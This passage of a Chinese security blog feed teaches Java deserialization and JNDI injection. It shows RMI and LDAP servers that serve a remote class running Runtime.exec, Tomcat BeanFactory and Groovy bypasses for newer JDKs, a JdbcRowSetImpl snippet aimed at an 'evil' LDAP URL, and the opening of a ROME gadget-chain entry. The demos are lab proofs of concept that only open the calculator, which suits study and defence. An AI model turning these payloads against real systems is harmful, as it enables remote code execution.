SignedObject.getObject之中 这里还存在一个readObject()方法 可以将我们传进来的在进行一次反序列化从而达到绕过的目的 然后是又一遍TemplatesImpl链
跟进去的话最后会走到BadAttributeValueExpException.readObject()方法，进行第二次反序列化

接下来的步骤和上面的TemplatesImpl链是一样的了
]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>java反序列化之jndi</title>
    <url>/2025/02/01/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bjndi/</url>
    <content><![CDATA[引用Java安全学习——JNDI注入
JNDI概述JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一种标准的Java命名系统接口。JNDI提供统一的客户端API，并由管理者将JNDI API映射为特定的命名服务和目录服务，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。简单来说，开发人员通过合理的使用JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务。如下图所示

命名服务（Naming Server）命名服务，简单来说，就是一种通过名称来查找实际对象的服务。比如我们的RMI协议，可以通过名称来查找并调用具体的远程对象。再比如我们的DNS协议，通过域名来查找具体的IP地址。这些都可以叫做命名服务。
例子：DNS（域名系统）

场景：当你在浏览器中输入 www.google.com 时，浏览器需要知道这个域名对应的 IP 地址才能访问网站。
命名服务的作用：
DNS 将域名（名称）映射到 IP 地址（对象）。
例如：
名称：www.google.com
对象：142.250.190.78（Google 的 IP 地址）




类比：
就像你通过电话簿查找“张三”的名字，找到他的电话号码一样。



在命名服务中，有几个重要的概念。

Bindings：表示一个名称和对应对象的绑定关系，比如在在 DNS 中域名绑定到对应的 IP，在RMI中远程对象绑定到对应的name,文件系统中文件名绑定到对应的文件。
Context：上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (SubContext)。
References：在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C&#x2F;C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。

目录服务（Directory Service）简单来说，目录服务是命名服务的扩展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性（Attributes）信息。由此，我们不仅可以根据名称去查找（Lookup）对象(并获取其对应属性)，还可以根据属性值去搜索（Search）对象。
一些常见的目录服务有：

LDAP： 轻型目录访问协议
Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等；
其他基于 X.500 (目录服务的标准) 实现的目录服务；

例子：LDAP（轻量级目录访问协议）

场景：公司内部有一个员工信息目录，你需要查找某个员工的详细信息。
目录服务的作用：
LDAP 不仅可以通过员工姓名找到对应的员工对象，还可以查询该员工的属性（如职位、邮箱、电话等）。
例如：
名称：cn=张三,ou=研发部,dc=公司,dc=com
对象：员工“张三”的信息。
属性：
职位：职位=软件工程师
邮箱：邮箱=zhangsan@company.com
电话：电话=123456789






类比：
就像你通过员工管理系统查找“张三”，不仅能找到他的联系方式，还能看到他的职位、部门等详细信息。



JNDI SPIJNDI 架构上主要包含两个部分，即 Java 的应用层接口和 SPI，如下图所示

SPI（Service Provider Interface），即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。
JDK 中包含了下述内置的命名目录服务:

RMI: Java Remote Method Invocation，Java 远程方法调用
LDAP: 轻量级目录访问协议
CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)
DNS（域名转换协议）

除此之外，用户还可以在 Java 官网下载其他目录服务实现。由于 SPI 的统一接口，厂商也可以提供自己的私有目录服务实现，用户无需重复修改代码。
JNDI代码示例JNDI 接口主要分为下述 5 个包:

javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类
javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir-Context类
javax.naming.event：在命名目录服务器中请求事件通知
javax.naming.ldap：提供LDAP服务支持
javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务

JNDI_RMIJDK版本为JDK8u_65
首先在本地起一个RMI服务（我用的还是自己学习rmi时候的例子，感兴趣的可以自己去翻一下前面的文章）
上面的目的是为了创建一个注册表
在这之后，文件JNDIRMIServer的代码如下
import javax.naming.InitialContext;public class JNDIRMIServer &#123;    public static void main(String[] args) throws Exception &#123;//        InitialContext 是 JNDI 的入口点，用于连接到命名服务（如 RMI 注册表、LDAP 等）        InitialContext initialContext = new InitialContext();        initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, new RemoteObjImpl());    &#125;&#125;

文件JNDIRMIClient代码如下：
import javax.naming.InitialContext;public class JNDIRMIClient &#123;    public static  void main(String[] args) throws Exception&#123;        InitialContext initialContext = new InitialContext();        IRemoteObj remoteObj = (IRemoteObj)initialContext.lookup(&quot;rmi://localhost:1099/remoteObj&quot;);        System.out.println(remoteObj.sayHello(&quot;hello&quot;));    &#125;&#125;

两文件都运行后，客户端成功执行了sayHello方法
JNDI_DNSimport javax.naming.Context;import javax.naming.NamingException;import javax.naming.directory.Attributes;import javax.naming.directory.DirContext;import javax.naming.directory.InitialDirContext;import java.util.Hashtable; public class JNDI_DNS &#123;    public static void main(String[] args) &#123;        Hashtable&lt;String,String&gt; env = new Hashtable&lt;&gt;();        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.dns.DnsContextFactory&quot;);        env.put(Context.PROVIDER_URL, &quot;dns://192.168.43.1&quot;);         try &#123;            DirContext ctx = new InitialDirContext(env);            Attributes res = ctx.getAttributes(&quot;goodapple.top&quot;, new String[] &#123;&quot;A&quot;&#125;);            System.out.println(res);        &#125; catch (NamingException e) &#123;            e.printStackTrace();        &#125;     &#125;&#125;

运行结果如下：
JNDI的工作流程在上文，我们通过JNDI成功地调用了RMI和DNS服务。那么对于JNDI来讲，它是如何识别我们调用的是何种服务呢？这就依赖于我们上面提到的Context（上下文）了。
初始化Context我以RMI服务为例
//设置JNDI环境变量Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;();env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);//初始化上下文Context initialContext = new InitialContext(env);

首先使用Hashtable类来设置属性*INITIAL_CONTEXT_FACTORY*和*PROVIDER_URL*的值。可以看到，这里我们将*INITIAL_CONTEXT_FACTORY*设置为了&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;，JNDI正是通过这一属性来判断我们将要调用何种服务。
接着我们将属性PROVIDER_URL设置为了&quot;rmi://localhost:1099&quot;，这正是我们RMI服务的地址。JNDI通过该属性来获取服务的路径，进而调用该服务。
最后向InitialContext类传入我们设置的属性值来初始化一个Context，于是我们就获得了一个与RMI服务相关联的上下文Context。
当然，初始化Context的方法多种多样，我们来看一下InitialContext类的构造函数
//构建一个默认的初始上下文public InitialContext(); //构造一个初始上下文，并选择不初始化它。protected InitialContext(boolean lazy); //使用提供的环境变量初始化上下文。public InitialContext(Hashtable&lt;?,?&gt; environment);

所以我们还可以用如下方式来初始化一个Context
//设置JNDI环境变量System.setProperty(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);System.setProperty(Context.PROVIDER_URL,&quot;rmi://localhost:1099&quot;); //初始化上下文InitialContext initialContext = new InitialContext();

通过Context与服务交互和RMI类似，Context同样通过以下五种方法来与被调用的服务进行交互
//将名称绑定到对象bind(Name name, Object obj) //枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名list(String name)  //检索命名对象lookup(String name) //将名称重绑定到对象 rebind(String name, Object obj)  //取消绑定命名对象unbind(String name) 

JNDI底层实现上下文的初始化我们通过JNDI来设置不同的上下文，就可以调用不同的服务。那么JNDI接口是如何实现这一功能的呢？这里我们仍以JNDI_RMI为例，我们从上下文的初始化开始。
JNDI_RMI代码如下：
import javax.naming.Context;import javax.naming.InitialContext;import java.util.Hashtable; public class JNDI_RMI &#123;    public static void main(String[] args) throws Exception &#123;        //设置JNDI环境变量        Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;();        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);        env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);        //初始化上下文        Context initialContext = new InitialContext(env);     &#125;&#125;

获取工厂类
我们来调试一下

在InitalContext#InitalContext()中，通过我们传入的HashTable进行init
跟进该方法中,可以发现就是根据我们输入的环境变量进行的初始化

继续跟进init方法中，步入getDefaultInitCtx()方法

继续跟进，最终跟到NamingManager#getInitialContext()中


这里首先通过getInitialContextFactoryBuilder()初始化了一个InitialContextFactoryBuilder类。如果该类为空，则将className设置为*INITIAL_CONTEXT_FACTORY*属性。还记得该属性是什么吗？就是我们手动设置的RMI上下文工厂类com.sun.jndi.rmi.registry.RegistryContextFactory。
继续往下走

这里通过loadClass()来动态加载我们设置的工厂类。最终调用的其实是RegistryContextFactory#getInitialContext()方法，通过我们的设置工厂类来初始化上下文Context
现在我们知道了，JNDI是通过我们设置的*INITIAL_CONTEXT_FACTORY*工厂类来判断将上下文初始化为何种类型，进而调用该类型上下文所对应的服务。调用链如下

获取服务交互所需资源
现在JNDI知道了我们想要调用何种服务，那么它又是如何知道服务地址以及获取服务的各种资源的呢？我们接着上文，跟到RegistryContextFactory#getInitialContext()中


其中的参数var1其实就是我们自己设的环境变量,跟进getInitCtxURL()

JNDI通过我们设置的*PROVIDER_URL*环境变量来获取服务的路径，接着在URLToContext()方法中初始化了一个rmiURLContextFactory类，并根据服务路径来获取实例。
回去之后我们跟进URLToContext方法

然后继续跟进getObjectInstance方法

再跟进到getUsingURL方法中

调用了lookup()方法，跟进去

继续跟进lookup方法,跟到RegistryContext#lookup()中，根据上述过程中获取的信息初始化了一个新的RegistryContext

可见，在最终初始化的时候获取了一系列RMI通信过程中所需的资源，包括RegistryImpl_Stub类、path、port等信息。如下图

JNDI在初始化上下文的时候获取了与服务交互所需的各种资源，所以下一步就是通过获取的资源和服务愉快地进行交互了。
各种调用链如下

JNDI动态协议转换上面两个例子中，我们手动设置了属性*INITIAL_CONTEXT_FACTORY*和*PROVIDER_URL*的值来对Context进行初始化。通过对Context的初始化，JNDI能够识别我们想调用何种服务，以及服务的路径。
但实际上，在 Context#lookup()方法的参数中，用户可以指定自己的查找协议。JNDI会通过用户的输入来动态的识别用户要调用的服务以及路径
我们来进行调试

要注意的是我们不管调用的是lookup、bind或者是其他initalContext中的方法，都会调用getURLOrDefaultInitCtx()方法进行检查

跟进getURLOrDefaultInitCtx()方法，会通过getURLScheme()方法来获取通信协议，比如这里获取到的是rmi协议

接着跟据获取到的协议，通过NamingManager#getURLContext()来调用getURLObject()方法

最终在getURLObject()方法中，根据*defaultPkgPrefix*属性动态生成Factory类

我们看一下JNDI默认支持那些动态协议转换。当我们针对JNDI进行攻击的时候可以优先考虑以下几种服务

通过动态协议转换，我们可以仅通过一串特定字符串就可以指定JNDI调用何种服务，十分方便。但是方便是会付出一定代价的。对于一个系统来讲，往往越方便，就越不安全。
假如我们能够控制string字段，那么就可以搭建恶意服务，并控制JNDI接口访问该恶意，于是将导致恶意的远程class文件加载，从而导致远程代码执行。这种攻击手法其实就是JNDI注入，它和RMI服务攻击手法中的”远程加载CodeBase”较为类似，都是通过一些远程通信来引入恶意的class文件，进而导致代码执行。
JNDI Reference类Reference类表示对存在于命名&#x2F;目录系统以外的对象的引用。比如远程获取 RMI 服务上的对象是 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载class文件来进行实例化。
这听起来是不是有点像RMI中Codebase的功能？当在本地找不到所调用的类时，我们可以通过Reference类来调用位于远程服务器的类。
Reference类常用构造函数如下
//className为远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载//factory为工厂类//factoryLocation为工厂类加载的地址，可以是file://、ftp://、http:// 等协议Reference(String className,  String factory, String factoryLocation) 

在RMI中，由于我们远程加载的对象需要继承UnicastRemoteObject类，所以这里我们需要使用ReferenceWrapper类对Reference类或其子类对象进行远程包装成Remote类使其能够被远程访问。
JNDI Reference 的作用

存储对象引用：
在命名服务中存储对象的引用信息，而不是对象本身。


延迟加载：
对象只有在客户端查找时才会被创建。


跨网络传递：
适用于需要跨网络传递对象的情况（如 RMI、LDAP 等）。



JNDI注入JNDI+RMI第一种上面客户端调用远程方法的时候感觉和原本的RMI是一样的，那么它是不是借助了原生的RMI来实现，如果是的话，那么整个过程也是通过序列化反序列化来实现的，那么我们之前说的攻击RMI的那些攻击方法是不是同样也可以用在这里了
我们下面来调试看看

强制步入lookup方法

继续步入lookup方法

继续步入lookup方法

可以发现我们调用的就是原生RMI的lookup方法，这是在文件RegistryContext中的，但我们最开始创建的是InitialContext，它会根据我们传进去的参数中协议的不同来调用不同的Context来处理
也就是说只要代码IRemoteObj remoteObj = (IRemoteObj)initialContext.lookup(&quot;rmi://localhost:1099/remoteObj&quot;);中lookup方法的参数是可控的话，那么我们就可以让其直接加载我们的恶意类来成功实现攻击
当然这不是传统的JNDI注入，下面我们来讲讲传统的注入方法
第二种传统的是利用Reference类来实现的
JNDIRMIServer代码如下：
import javax.naming.InitialContext;import javax.naming.Reference;public class JNDIRMIServer &#123;    public static void main(String[] args) throws Exception &#123;//        InitialContext 是 JNDI 的入口点，用于连接到命名服务（如 RMI 注册表、LDAP 等）        InitialContext initialContext = new InitialContext();//        initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, new RemoteObjImpl());        Reference refObj = new Reference(&quot;T&quot;, &quot;T&quot;, &quot;http://localhost:7777/&quot;);        initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, refObj);    &#125;&#125;

其中的类T内容如下：
import java.io.IOException;public class T &#123;    static &#123;        try &#123;            Runtime.getRuntime().exec(&quot;calc&quot;);        &#125; catch (IOException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public T() throws IOException &#123;        Runtime.getRuntime().exec(&quot;calc&quot;);    &#125;&#125;

将其编译后的文件移到不同文件夹下，删除T.java文件，然后用python起一个服务

这个时候服务端就可以正常运行，rebind方法可以正常进行绑定，客户端再运行的话就会弹出计算器
JNDIRMIClient代码如下：
import javax.naming.InitialContext;public class JNDIRMIClient &#123;    public static  void main(String[] args) throws Exception&#123;        InitialContext initialContext = new InitialContext();        initialContext.lookup(&quot;rmi://localhost:1099/remoteObj&quot;);    &#125;&#125;

当然我们可以来调试一下，看看这个过程是怎么样的

前面几步都是一样的，走到lookup函数后继续往下走

下面有一个decodeObject方法，这个方法的作用是用来解码从远程服务器接收到的对象，将其解码为本地的可用对象

如果对象是一个远程引用（RemoteRef），decodeObject 会将其解码为远程代理对象。
如果对象是一个普通对象，decodeObject 会直接返回该对象

我们跟进该方法中

这里的重点是getObjectInstance方法，我们跟进去，一直往下走到这里

我们也跟进去，可以看到首先是进行了本地类加载，在本地查找是否存在类T，但是我们知道当然是没有的，所以这里肯定还是null

没事，我们继续往下走

可以自己跟进去看看codebase的值是什么–是我们之前起的远程服务器的地址

出去后继续往下走，又开始了通过loadCLass方法进行类加载，不过这次是远程类加载，从我们的远程服务器上面来获取相关类

走完这一步后就成功弹窗了，loadClass方法谈的计算器是静态代码块中的

再往下走，走完这一步后也会弹一个计算器出来，newInstance方法是通过反射动态创建对象实例，这个时候会调用构造方法，会执行其中的弹计算器的命令

要注意，两个计算器弹出来的原因是不一样的
JNDI+LDAPLDAP简介LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议，运行在TCP&#x2F;IP堆栈之上。LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。 LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。
也就是说，LDAP 「是一个协议」，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容。而 「LDAP 协议的实现」，有着众多版本，例如微软的 Active Directory 是 LDAP 在 Windows 上的实现。AD 实现了 LDAP 所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。再例如 OpenLDAP 是可以运行在 Linux 上的 LDAP 协议的开源实现。而我们平常说的 LDAP Server，一般指的是安装并配置了 Active Directory、OpenLDAP 这些程序的服务器。
在LDAP中，我们是通过目录树来访问一条记录的，目录树的结构如下
dn ：一条记录的详细位置dc ：一条记录所属区域    (哪一颗树)ou ：一条记录所属组织    （哪一个分支）cn/uid：一条记录的名字/ID   (哪一个苹果名字)...LDAP目录树的最顶部就是根，也就是所谓的“基准DN&quot;。

假设你要树上的一个苹果（一条记录），你怎么告诉园丁它的位置呢？当然首先要说明是哪一棵树（dc，相当于MYSQL的DB），然后是从树根到那个苹果所经过的所有“分叉”（ou），最后就是这个苹果的名字（uid，相当于MySQL表主键id）。
当然，我们也可以使用LDAP服务来存储Java对象，如果我们此时能够控制JNDI去访问存储在LDAP中的Java恶意对象，那么就有可能达到攻击的目的。LDAP能够存储的Java对象如下

Java 序列化
JNDI的References
Marshalled对象
Remote Location


在8u121之后上面的方法便行不通了
在8u191之前可以使用ldap来进行绕过

注入首先我们先下载一个软件来专门起LDAP服务：https://directory.apache.org/studio/download/download-windows.html
该软件所需的JDK版本是11，但是要在11.0.25以下（亲测11.0.25不行）
在软件中新起一个服务并新建一个连接后如下所示：
JNDILDAPServer文件代码如下：
import javax.naming.InitialContext;import javax.naming.Reference;public class JNDILDAPServer &#123;    public static void main(String[] args) throws Exception &#123;        InitialContext initialContext = new InitialContext();        Reference refObj = new Reference(&quot;T&quot;, &quot;T&quot;, &quot;http://localhost:7777/&quot;);        initialContext.rebind(&quot;ldap://localhost:10389/cn=test,dc=example,dc=com&quot;, refObj);    &#125;&#125;

代码中的cn值任取
至于为什么端口号是10389主要是因为配置中LDAP服务端口的默认设置

运行后会更新成如下所示：
可以看到我们的类绑上去了，所以我们就可以直接在客户端上面进行查询了
JNDILDAPClient文件代码如下：
import javax.naming.InitialContext;public class JNDILDAPClent &#123;    public static  void main(String[] args) throws Exception&#123;        InitialContext initialContext = new InitialContext();        initialContext.lookup(&quot;ldap://localhost:10389/cn=test,dc=example,dc=com&quot;);    &#125;&#125;

运行后便会弹出计算器

接下来我们可以调试一下是怎么导致的，同样是调lookup函数
前面一部分自己去调试，然后会走到这个比较重要的文件这里

该函数比较种重要的地方也是下面的decodeObject函数

var4就是从LDAP服务器上面获取到的属性，那么下一步就是要解析这些属性，所以我们跟进去

从函数的具体内容里面我们也可以看到如果说取回来的字段代表的是序列化的，那就调用第一个if中的方法，如果是远程对象的话就调用第二个if中的，如果是引用的话，就是调用else中的decodeReference方法，通过该方法就把引用给解出来了，也就相当于获取到了我们绑定的reference

下一步就和上面的一样，要根据该reference来查找远程地址里面的恶意类
往下走就到了这里

很熟悉了吧，我们接着跟进去，走到这里

剩下的和之前的是一样的，感兴趣继续跟进去，这里就不一一赘述了
高版本绕过在我们利用Codebase攻击RMI服务的时候，如果想要根据Codebase加载位于远端服务器的类时，java.rmi.server.useCodebaseOnly的值必须为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true
JNDI同样有类似的限制，在JDK 6u132, JDK 7u122, JDK 8u113之后Java限制了通过RMI远程加载Reference工厂类。com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为了false，即默认不允许通过RMI从远程的Codebase加载Reference工厂类。如下所示
Exception in thread &quot;main&quot; javax.naming.ConfigurationException: The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495)	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)	at javax.naming.InitialContext.lookup(InitialContext.java:417)	at JNDI_Dynamic.main(JNDI_Dynamic.java:7) Process finished with exit code 1

JNDI_LDAP_Reference限制但是需要注意的是JNDI不仅可以从通过RMI加载远程的Reference工厂类，也可以通过LDAP协议加载远程的Reference工厂类，但是在之后的版本Java也对LDAP Reference远程加载Factory类进行了限制，在JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase属性的默认值同样被修改为了false，对应的CVE编号为：CVE-2018-3149。
源码分析这里我们以RMI服务为例
这里用的版本是8u251
可以发现当我们运行客户端之后既没有报错也没有弹计算器，我们可以调试着看一下是修改了哪些地方，同样是调lookup方法
前面的流程都是一样的，我们直接快进到下面这一步

跟进该方法中，该方法之前说过会先进行本地类加载，加载不到之后再到codebase中进行加载，所以我们现在就看一下在codebase中时怎么进行加载的

我们可以看到这里面多加了一个判断：&quot;true&quot;.equalsIgnoreCase(trustURLCodebase)，只有当这个为true的时候才能够从远端进行类加载
而trustURLCodebase默认为false，所以显然是进入不到if中的，会return null，也不会报错
因此类也就加载不出来，自然也就弹不了计算器了
回顾一下这个过程，我们知道引用还是可以正常加载出来的，但是通过引用来远程加载工厂类的（也就是factory）时候就行不通了
那么这个时候我们的思路就是要找找可以本地加载出来的工厂类，也要比较经常用的
绕过方法使用本地的Reference Factory类8u191后已经默认不允许加载codebase中的远程类，但我们可以从本地加载合适Reference Factory。
需要注意是，该本地工厂类必须实现javax.naming.spi.ObjectFactory接口,因为在javax.naming.spi.NamingManager#getObjectFactoryFromReference最后的return语句对Factory类的实例对象进行了类型转换，并且该工厂类至少存在一个getObjectInstance()方法
Tomcat8org.apache.naming.factory.BeanFactory就是满足条件之一，并由于该类存在于Tomcat8依赖包中，攻击面和成功率还是比较高的。
org.apache.naming.factory.BeanFactory 在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。
服务端和客户端加载依赖
&lt;dependency&gt;    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;    &lt;version&gt;8.5.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.lucee&lt;/groupId&gt;    &lt;artifactId&gt;javax.el&lt;/artifactId&gt;    &lt;version&gt;3.0.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;            &lt;groupId&gt;org.glassfish&lt;/groupId&gt;            &lt;artifactId&gt;javax.el&lt;/artifactId&gt;            &lt;version&gt;3.0.0&lt;/version&gt;        &lt;/dependency&gt;

在该类中也有一个getObjectInstance方法，因此在上面进行到：factory.getObjectInstance一行时就会走到该文件中
该方法重点就在于有一个反射调用

由于是从根源上绕过，所以无论是起一个rmi还是ldap服务都是可以的，下面起的是rmi服务
先开一个注册中心
服务端代码：
import org.apache.naming.ResourceRef;import javax.naming.InitialContext;import javax.naming.StringRefAddr;public class JNDIRMIServerBypass &#123;    public static void main(String[] args) throws Exception &#123;        InitialContext initialContext = new InitialContext();        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));        ref.add(new StringRefAddr(&quot;x&quot;, &quot;Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;));        initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, ref);    &#125;&#125;

客户端代码：
import javax.naming.InitialContext;public class JNDIRMIClient &#123;    public static  void main(String[] args) throws Exception&#123;        InitialContext initialContext = new InitialContext();        initialContext.lookup(&quot;rmi://localhost:1099/remoteObj&quot;);    &#125;&#125;

执行了之后会弹出计算器
也就是说如果高版本有依赖Tmocat8的环境来的话，我们就可以通过这种方法来进行绕过
Groovy在Groovy的官方文档(ASTest)中，可以发现的是，Groovy程序允许我们执行断言，也就意味着命令执行
@ASTTest是一种特殊的AST转换，它会在编译期对AST执行断言，而不是对编译结果执行断言。这意味着此AST转换在生成字节码之前可以访问 AST。@ASTTest可以放置在任何可注释节点上。
因此思路和Tomcat相似，借助BeanFactory的功能，使程序执行GroovyClassLoader#parseClass，然后去解析Groovy脚本。
添加如下依赖
&lt;dependency&gt;    &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt;    &lt;artifactId&gt;groovy&lt;/artifactId&gt;    &lt;version&gt;2.4.5&lt;/version&gt;&lt;/dependency&gt;

恶意服务端
import com.sun.jndi.rmi.registry.ReferenceWrapper;import org.apache.naming.ResourceRef;import javax.naming.NamingException;import javax.naming.StringRefAddr;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry; public class RMI_Server_Bypass_Groovy &#123;     public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException &#123;        Registry registry = LocateRegistry.createRegistry(1099);        ResourceRef resourceRef = new ResourceRef(&quot;groovy.lang.GroovyClassLoader&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;faster=parseClass&quot;));        String script = String.format(&quot;@groovy.transform.ASTTest(value=&#123;\nassert java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;)\n&#125;)\ndef faster\n&quot;, &quot;calc&quot;);        resourceRef.add(new StringRefAddr(&quot;faster&quot;,script));        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);        registry.bind(&quot;Groovy2bypass&quot;, referenceWrapper);        System.out.println(&quot;Registry运行中......&quot;);    &#125;&#125;


修改系统变量trustURLCodebase属性是一个系统变量，正好java里面也有提供如何修改系统变量值的方法

System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);Field field = BaseRowSet.class.getDeclaredField(&quot;dataSource&quot;);field.setAccessible(true);JdbcRowSetImpl jdbcRowSet = createObjWithoutConstructor(JdbcRowSetImpl.class);field.set(jdbcRowSet,&quot;ldap://127.0.0.1:8085/evil&quot;);jdbcRowSet.getDatabaseMetaData();
]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>java反序列化之Rome</title>
    <url>/2025/03/21/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRome/</url>
    <content><![CDATA[引用Java安全学习——ROME反序列化
Java反序列化之Rome
什么是ROMEROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。
Rome 提供了 ToStringBean 这个类，提供深入的 toString 方法对JavaBean进行操作
依赖&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;rome&lt;/groupId&gt;        &lt;artifactId&gt;rome&lt;/artifactId&gt;        &lt;version&gt;1.0&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;

典型gadget我们看yso中链子是怎么写的
/** * * TemplatesImpl.getOutputProperties() * NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) * NativeMethodAccessorImpl.invoke(Object, Object[]) * DelegatingMethodAccessorImpl.invoke(Object, Object[]) * Method.invoke(Object, Object...) * ToStringBean.toString(String) * ToStringBean.toString() * ObjectBean.toString() * EqualsBean.beanHashCode() * ObjectBean.hashCode() * HashMap&lt;K,V&gt;.hash(Object) * HashMap&lt;K,V&gt;.readObject(ObjectInputStream) * * @author mbechler * */

该链最后是利用getOutputProperties方法进行任意类加载
我们一步步往前看，首先是ToStringBean.toString(String)

由内容可知该方法会调用任意的getter方法，所以TemplatesImpl类正是利用这个来实现反射调用getOutputProperties()方法，从而实现了任意类加载
ToStringBean类的构造方法有两个参数，其中_beanClass为JavaBean类型的class，_obj为要调用的对象，这里要传入的当然就是要利用的TemplatesImpl类

toString(String)方法是在本类中的toString()方法中被调用

其中参数prefix的值对后续的利用没有任何的影响，所以我们不需要管
往上走到EqualsBean类的beanHashCode()方法，它会调用参数_obj的toString方法

看下该类的构造函数
public EqualsBean(Class beanClass,Object obj) &#123;    if (!beanClass.isInstance(obj)) &#123;        throw new IllegalArgumentException(obj.getClass()+&quot; is not instance of &quot;+beanClass);    &#125;    _beanClass = beanClass;    _obj = obj;&#125;

发现只要我们把参数beanClass赋值为ToStringBean类，obj为其对应的实例对象，那么就可以直接调用它的ToSting方法
同时EqualsBean类中还存在hashCode()方法

通过hashCode()方法便会调用beanHashCode()方法
看到hashCode()方法的时候入口类想必就已经知道是哪一个了吧，就是HashMap类，其key值要为EqualsBean类的实例对象
poc如下：
